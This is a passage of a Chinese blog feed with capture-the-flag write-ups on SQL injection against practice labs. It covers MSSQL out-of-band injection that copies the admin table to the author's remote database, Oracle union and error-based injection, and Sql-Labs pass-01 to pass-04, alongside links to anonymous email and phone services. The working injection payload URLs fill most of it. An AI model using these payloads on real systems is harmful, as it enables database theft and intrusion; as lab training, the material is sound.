<li><strong>香港云如果失效用这个：<a href="https://my.gearhost.com/CloudSite、http://mssqlus.webweb.com/" target="_blank" rel="noopener">https://my.gearhost.com/CloudSite、http://mssqlus.webweb.com/</a> （数据库操作)</strong></li>
<li><strong>临时邮箱：<a href="https://rootsh.com/" target="_blank" rel="noopener">https://rootsh.com/</a></strong></li>
<li><strong>匿名电话号码：<a href="https://yunduanxin.net/" target="_blank" rel="noopener">https://yunduanxin.net/</a></strong></li>
</ol>
</blockquote>
<ol>
<li><strong>环境准备</strong></li>
</ol>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727150456648.png" alt="image-20210727150456648"></p>
</blockquote>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727150913263.png" alt="image-20210727150913263"></p>
</blockquote>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727150847416.png" alt="image-20210727150847416"></p>
</blockquote>
<ol start="2">
<li><strong>如果连接navicat连接报错，去该软件下载目录找到这个安装</strong></li>
</ol>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727151753335.png" alt="image-20210727151753335"></p>
</blockquote>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727151816489.png" alt="image-20210727151816489"></p>
</blockquote>
<ol start="3">
<li><strong>连接成功后可以开始了</strong></li>
</ol>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727151918688.png" alt="image-20210727151918688"></p>
</blockquote>
<ol start="4">
<li><strong>构建sql连接语句</strong></li>
</ol>
<blockquote>
<ul>
<li><p>确认我的<strong>环境数据</strong></p>
</li>
<li><p>MSSQL服务器</p>
</li>
<li><p><strong>数据库服务器URL：SQL5095.site4now.net</strong></p>
</li>
<li><p><strong>数据库名称：DB_14DC16C_gylq</strong></p>
</li>
<li><p><strong>用户名：DB_14DC16C_gylq_admin</strong></p>
</li>
<li><p><strong>密码：12345678</strong></p>
</li>
</ul>
</blockquote>
<ul>
<li>查表和原理</li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727154307488.png" alt="image-20210727154307488"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8015/?id=1';<span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(<span class="string">'sqloledb'</span>,<span class="string">'server=SQL5095.site4now.net,1433;uid=DB_14DC16C_gylq_admin;pwd=12345678;database=DB_14DC16C_gylq'</span>).DB_14DC16C_gylq.dbo.test <span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>​    <img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727154120809.png" alt="image-20210727154120809"></p>
</blockquote>
<ul>
<li><strong>接着按f5刷新一下就出现结果了</strong></li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727154145501.png" alt="image-20210727154145501"></p>
</blockquote>
<ul>
<li><strong>查字段</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8015/?id=1';<span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(<span class="string">'sqloledb'</span>,<span class="string">'server=SQL5095.site4now.net,1433;uid=DB_14DC16C_gylq_admin;pwd=12345678;database=DB_14DC16C_gylq'</span>).DB_14DC16C_gylq.dbo.test <span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'admin'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727154653257.png" alt="image-20210727154653257"></p>
</blockquote>
<ul>
<li><strong>查flag，创建四个字段，执行以下语句，然后navicat刷新一下就好</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8015/?id=1';<span class="keyword">insert</span> <span class="keyword">into</span> opendatasource(<span class="string">'sqloledb'</span>,<span class="string">'server=SQL5095.site4now.net,1433;uid=DB_14DC16C_gylq_admin;pwd=12345678;database=DB_14DC16C_gylq'</span>).DB_14DC16C_gylq.dbo.test <span class="keyword">select</span> <span class="keyword">id</span>,username,passwd,token <span class="keyword">from</span> <span class="keyword">admin</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727155032276.png" alt="image-20210727155032276"></p>
<h1 id="Oracle——报错注入和显错注入"><a href="#Oracle——报错注入和显错注入" class="headerlink" title="Oracle——报错注入和显错注入"></a>Oracle——报错注入和显错注入</h1><blockquote>
<p>练习环境：<a href="http://59.63.200.79:8808/index_x.php" target="_blank" rel="noopener">http://59.63.200.79:8808/index_x.php</a>  （这里面可以试炼一下oracle语句）</p>
<p>环境：<a href="http://59.63.200.79:8808/" target="_blank" rel="noopener">http://59.63.200.79:8808/</a></p>
</blockquote>
<ul>
<li>练习环境学习下oracle语法</li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727161314673.png" alt="image-20210727161314673"></p>
</blockquote>
<ul>
<li>虚表</li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727161350132.png" alt="image-20210727161350132"></p>
</blockquote>
<ul>
<li>查询出所有的表 </li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727161434158.png" alt="image-20210727161434158"></p>
</blockquote>
<ul>
<li><strong>所以想要注入orcle的表就不能用information了，用all_tables，举个例子</strong></li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727161543428.png" alt="image-20210727161543428"></p>
</blockquote>
<ul>
<li><strong>查当前用户的所有表</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> user_tables</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727161644899.png" alt="image-20210727161644899"></p>
<ul>
<li><strong>查询出所有字段</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> all_tab_columns</span><br></pre></td></tr></table></figure></div>

<ul>
<li>查询出当前用户所有字段</li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727162236319.png" alt="image-20210727162236319"></p>
<ul>
<li>查版本</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> v$<span class="keyword">version</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727162329476.png" alt="image-20210727162329476"></p>
<ul>
<li><strong>为了等下做准备，rownum也需要使用（限制查询返回的总行数）</strong></li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727162448565.png" alt="image-20210727162448565"></p>
<ul>
<li><strong>上面只用于数据少的情况，如果要看第二行就得利用&lt;&gt;不等号，oracle还区分大小写</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="keyword">rownum</span>=<span class="number">1</span> <span class="keyword">and</span> column_name&lt;&gt;<span class="string">'UNAME'</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727162716588.png" alt="image-20210727162716588"></p>
<ul>
<li><strong>或者用别名法，来探查其他数据</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> column_name, <span class="keyword">rownum</span> n <span class="keyword">from</span> user_tab_columns) <span class="keyword">where</span> n=<span class="number">2</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727163216170.png" alt="image-20210727163216170"></p>
<blockquote>
<ul>
<li><strong>根据上面的知识，这题虽然提示是用报错注入做，但是也可以用显错注入做。先用显错注入做一下</strong></li>
</ul>
</blockquote>
<ul>
<li><strong>测有四个字段</strong></li>
</ul>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727164703762.png" alt="image-20210727164703762"></p>
</blockquote>
<ul>
<li><strong>测每个字段的数据类型和mssql数据库一样严谨，用null填充</strong></li>
</ul>
<blockquote>
<ul>
<li><strong>需要注意一点，这里不能直接用字符填上去，需要加上to_nchar()函数将输入的数据转换为字符串，不然oracle识别不出来会报错</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8808/?id=1.1 union all <span class="keyword">select</span> <span class="number">1</span>,to_nchar(<span class="string">'注入点'</span>),to_nchar(<span class="string">'注入点'</span>),<span class="number">4</span> <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727164907401.png" alt="image-20210727164907401"></p>
</blockquote>
<ul>
<li>爆表，<strong>别名爆表rownum法</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8808/?id=1.1 union all <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">rownum</span> n,to_nchar(table_name),to_nchar(<span class="string">'注入点'</span>),<span class="number">4</span> <span class="keyword">from</span> user_tables) <span class="keyword">where</span> n=<span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727165117439.png" alt="image-20210727165117439"></p>
<ul>
<li><strong>NEWS明显不是我们想要的，下一个</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8808/?id=1.1 union all <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">rownum</span> n,to_nchar(table_name),to_nchar(<span class="string">'注入点'</span>),<span class="number">4</span> <span class="keyword">from</span> user_tables) <span class="keyword">where</span> n=<span class="number">3</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727165334321.png" alt="image-20210727165334321"></p>
<ul>
<li>爆字段也是一样找出了 UNAME，UPASS</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;59.63.200.79:8808&#x2F;?id&#x3D;1.1 union all select * from (select rownum n,to_nchar(column_name),to_nchar(&#39;注入点&#39;),4 from user_tab_columns) where n&#x3D;1</span><br></pre></td></tr></table></figure></div>

<ul>
<li>拿密码</li>
</ul>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727165642817.png" alt="image-20210727165642817"></p>
<blockquote>
<ul>
<li>第二种方式，就是报错注入，需要了解一些函数<strong>ctxsys.drithsx.sn</strong></li>
</ul>
</blockquote>
<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727170155105.png" alt="image-20210727170155105"></p>
</blockquote>
<ul>
<li>我们实验一下,直接显错出来</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> dual <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=ctxsys.drithsx.sn(<span class="number">1</span>,(<span class="keyword">select</span> to_nchar(<span class="string">'显错点'</span>) <span class="keyword">from</span> dual))</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727170820786.png" alt="image-20210727170820786"></p>
<ul>
<li>显示表</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> dual <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=ctxsys.drithsx.sn(<span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">rownum</span> n, table_name <span class="keyword">from</span> user_tables) <span class="keyword">where</span> n=<span class="number">3</span>))</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727171247370.png" alt="image-20210727171247370"></p>
</blockquote>
<ul>
<li>显示字段</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> dual <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=ctxsys.drithsx.sn(<span class="number">1</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">rownum</span> n, column_name <span class="keyword">from</span> user_tab_columns) <span class="keyword">where</span> n=<span class="number">2</span>))</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727171406084.png" alt="image-20210727171406084"></p>
<blockquote>
<ul>
<li><strong>正式开始，学了这些知识，再去环境里面看看，怎么使用ctxsys.drithsx.sn来实现报错注入</strong></li>
</ul>
</blockquote>
<ul>
<li>查一下版本</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8808/?id=1 and 1=ctxsys.drithsx.sn(1,(<span class="keyword">select</span> banner <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">rownum</span> n, banner <span class="keyword">from</span> v$<span class="keyword">version</span>) <span class="keyword">where</span> n=<span class="number">1</span>))</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727171805739.png" alt="image-20210727171805739"></p>
</blockquote>
<ul>
<li><strong>查一下表，根据我们上面用的知识</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8808/?id=1 and 1=ctxsys.drithsx.sn(1,(<span class="keyword">select</span> table_name <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">rownum</span> n, table_name <span class="keyword">from</span> user_tables) <span class="keyword">where</span> n=<span class="number">3</span>))</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727171912981.png" alt=""></p>
<ul>
<li><strong>查字段一样，根据更改n的数值来顺序查询，找到UNAME,UPASS</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://59.63.200.79:8808/?id=1 and 1=ctxsys.drithsx.sn(1,(<span class="keyword">select</span> column_name <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">rownum</span> n, column_name <span class="keyword">from</span> user_tab_columns) <span class="keyword">where</span> n=<span class="number">2</span>))</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727172429272.png" alt="image-20210727172429272"></p>
<ul>
<li><strong>查flag</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;59.63.200.79:8808&#x2F;?id&#x3D;1 and 1&#x3D;ctxsys.drithsx.sn(1,(select upass from(select rownum n, upass from admin) where n&#x3D;2))</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727172631000.png" alt="image-20210727172631000"></p>
</blockquote>
<ul>
<li><strong>sql注入部分结束</strong></li>
</ul>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210727175243508.png" alt="image-20210727175243508"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>SQL注入</tag>
        <tag>黑客工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【封神台】Sql-Labs wp</title>
    <url>/2021/07/25/%E3%80%90%E5%B0%81%E7%A5%9E%E5%8F%B0%E3%80%91Sql-Labs%20wp/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>掌控安全里面的靶场Sql-Labs，练练手！</li>
<li>环境：<a href="http://inject2.lab.aqlab.cn:81/" target="_blank" rel="noopener">http://inject2.lab.aqlab.cn:81/</a></li>
</ul>
</blockquote>
<h1 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = <span class="string">''</span>;</span><br><span class="line">$password = <span class="string">''</span>;</span><br><span class="line">@$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">@$sql = <span class="string">'select *from user where id='</span>.$id;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">// 不想让你们知道库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">while</span> ($row = mysqli_fetch_array($result))&#123;  </span><br><span class="line">$username = $row[<span class="string">'username'</span>];</span><br><span class="line">$password = $row[<span class="string">'password'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>.$username;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span>.$password;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>显错注入、先判断多少个字段</strong></li>
</ul>
</blockquote>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725131955354.png" alt="image-20210725131955354"></p>
<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725132104676.png" alt="image-20210725132104676"></p>
<blockquote>
<ul>
<li><strong>查表</strong>拓展： 1 and exists(select * from user)这种形式可以猜解表是否存在</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>();</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725132232796.png" alt="image-20210725132232796"></p>
<blockquote>
<ul>
<li><strong>查flag表中字段</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> f.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="number">0x6572726f725f666c6167</span>; </span><br><span class="line">//0x6572726f725f666c6167是error_flag的十六进制</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725132608204.png" alt="image-20210725132608204"></p>
<blockquote>
<ul>
<li><strong>拿flag //后面就不截图了</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://inject2.lab.aqlab.cn:81/Pass-01/index.php?id=1 union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,flag <span class="keyword">from</span> error_flag;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725132743133.png" alt="image-20210725132743133"></p>
<h1 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = <span class="string">''</span>;</span><br><span class="line">$password = <span class="string">''</span>;</span><br><span class="line">@$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">@$sql = <span class="string">'select *from user where id='</span>\<span class="string">''</span>.$id.<span class="string">'\''</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">// 不想让你们知道库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">while</span> ($row = mysqli_fetch_array($result))&#123;  </span><br><span class="line">$username = $row[<span class="string">'username'</span>];</span><br><span class="line">$password = $row[<span class="string">'password'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>.$username;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span>.$password;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>给id传参加了个单引号，和上题一样的做法差不多，就是1后面加个’来闭合源代码中的单引号，再加个#号url编码也就是%23注释掉后面的单引号，也就可以联合查询了</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://inject2.lab.aqlab.cn:81/Pass-02/index.php?id=1' union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,flag <span class="keyword">from</span> error_flag %<span class="number">23</span>;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725133156333.png" alt="image-20210725133156333"></p>
<h1 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">sername = <span class="string">''</span>;</span><br><span class="line">$password = <span class="string">''</span>;</span><br><span class="line">@$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">@$sql = <span class="string">'select *from user where id='</span>(\<span class="string">''</span>.$id.<span class="string">'\')'</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">// 不想让你们知道库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">while</span> ($row = mysqli_fetch_array($result))&#123;  </span><br><span class="line">$username = $row[<span class="string">'username'</span>];</span><br><span class="line">$password = $row[<span class="string">'password'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>.$username;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span>.$password;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>上题id是’id’这题是加了个括号(‘id’)，不过意思不变，同样是进行构造’)在1后面然后利用注释符#来绕过也就是%23</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">http://inject2.lab.aqlab.cn:81/Pass-03/index.php?id=1') union all <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,flag <span class="keyword">from</span> error_flag %<span class="number">23</span>;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725134152613.png" alt="image-20210725134152613"></p>
<h1 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$username = <span class="string">''</span>;</span><br><span class="line">$password = <span class="string">''</span>;</span><br><span class="line">@$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">@$sql = <span class="string">'select *from user where id=("'</span>.$id.<span class="string">'")'</span>;</span><br><span class="line">mysqli_select_db($conn,<span class="string">'****'</span>);<span class="comment">// 不想让你们知道库名</span></span><br><span class="line">$result = mysqli_query($conn,$sql);</span><br><span class="line"><span class="keyword">while</span> ($row = mysqli_fetch_array($result))&#123;  </span><br><span class="line">$username = $row[<span class="string">'username'</span>];</span><br><span class="line">$password = $row[<span class="string">'password'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name:'</span>.$username;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password:'</span>.$password;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>单引号变双引号</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//inject2.lab.aqlab.cn:81/Pass-04/index.php?id=1") union all select 1,2,flag from error_flag %23;</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gitee.com/gylq/cloudimages/raw/master/img/image-20210725134258334.png" alt="image-20210725134258334"></p>
